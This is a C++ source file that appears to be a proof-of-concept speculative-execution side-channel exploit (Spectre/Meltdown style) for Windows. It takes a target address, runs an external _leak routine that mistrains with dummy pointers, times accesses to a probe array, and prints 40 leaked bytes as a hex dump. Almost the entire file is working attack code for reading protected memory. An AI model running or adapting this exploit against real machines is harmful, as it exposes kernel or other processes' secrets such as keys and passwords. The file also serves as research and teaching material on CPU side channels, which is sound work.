#include "stdafx.h"

extern "C" {
	LPVOID probeArray;
	LPVOID timings;
	QWORD  _leak(LPVOID ptr, DWORD dwSize, LPVOID lpDummy);
}

BYTE leak(LPVOID ptrAddr);

// from https://github.com/FlibbleMr/neolib
template<class Elem, class Traits>
void __cdecl hex_dump(const void* aData, size_t aLength, std::basic_ostream<Elem, Traits>& aStream, size_t aWidth)
{
	const char* const start = static_cast<const char*>(aData);
	const char* const end = start + aLength;
	const char* line = start;
	while (line != end)
	{
		aStream.width(4);
		aStream.fill('0');
		aStream << std::hex << line - start << " : ";
		size_t lineLength = min(aWidth, static_cast<std::size_t>(end - line));
		for (size_t pass = 1; pass <= 2; ++pass)
		{
			for (const char* next = line; next != end && next != line + aWidth; ++next)
			{
				char ch = *next;
				switch (pass)
				{
				case 1:
					aStream << (ch < 32 ? '.' : ch);
					break;
				case 2:
					if (next != line)
						aStream << " ";
					aStream.width(2);
					aStream.fill('0');
					aStream << std::hex << std::uppercase << static_cast<int>(static_cast<unsigned char>(ch));
					break;
				}
			}
			if (pass == 1 && lineLength != aWidth)
				aStream << std::string(aWidth - lineLength, ' ');
			aStream << " ";
		}
		aStream << std::endl;
		line = line + lineLength;
	}
}

int main(int argc, char* argv[])
{
	LPVOID ptrTarget;
	ptrTarget = (LPVOID)strtoull(argv[1], NULL, 16);
	CONST QWORD n = 4 * 0x0a;
	BYTE lpBuffer[n] = { 0 };

	std::cout << "leaking " << std::hex << ptrTarget << std::endl;
	for (DWORD i = 0; i < n; i++) {
		DWORD dwCounter = 0;
		do {
			lpBuffer[i] = (BYTE)leak(((LPBYTE)ptrTarget) + i);
		} while ((DWORD)lpBuffer[i] == 0 && dwCounter++ < 0x1000);
		std::cout << std::hex << (DWORD)lpBuffer[i] << std::endl;
	}
	hex_dump(lpBuffer, n, std::cout, 0x0a);

	return 0;
}

BYTE leak(LPVOID ptrAddr) {
	QWORD qwTargets = 0x100;
	QWORD qwDummy = 0x4141414141414141u;
	LPVOID* lpTarget = (LPVOID*)malloc(qwTargets * sizeof(QWORD));
	QWORD* lpMask = (QWORD*)malloc(qwTargets * sizeof(QWORD));

	for (DWORD i = 0; i < (qwTargets - 1); i++) {
		lpTarget[i] = &qwDummy;
		lpMask[i] = TRUE;
	}

	probeArray = malloc(0x1000 * 0x100);
	lpTarget[qwTargets - 1] = ptrAddr;
	lpMask[qwTargets - 1] = FALSE;

	timings = malloc(0x100 * sizeof(QWORD));
	QWORD leakedByte = 0;
	BYTE result = 0;

	BOOL match = FALSE;
	do {
		leakedByte = _leak(lpTarget, qwTargets, lpMask);
		for (DWORD i = 0; i < 0x100; i++) {
			if (((QWORD*)timings)[i] < 100) {
				match = TRUE;
				result = i;
				break;
			}
		}
	} while (!match);

	free(probeArray);
	free(lpTarget);
	free(lpMask);

	return (BYTE)result;
}

